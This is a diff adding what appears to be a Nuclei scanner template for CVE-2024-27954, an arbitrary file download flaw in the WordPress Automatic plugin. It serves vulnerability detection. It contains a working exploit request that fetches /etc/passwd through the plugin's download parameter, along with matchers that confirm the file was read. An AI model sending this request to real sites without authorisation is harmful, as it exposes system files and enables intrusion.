@@ -1,0 +1,27 @@
+id: wordpress-automatic-plugin-anyfile-download
+info:
+  name: WordPress Automatic Plugin Arbitrary File Download (CVE-2024-27954)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2024-27954,arbitrary-file-access
+http:
+  - raw:
+      - |
+        GET /?p=3232&wp_automatic=download&link=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "\"status\":\"success\""
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
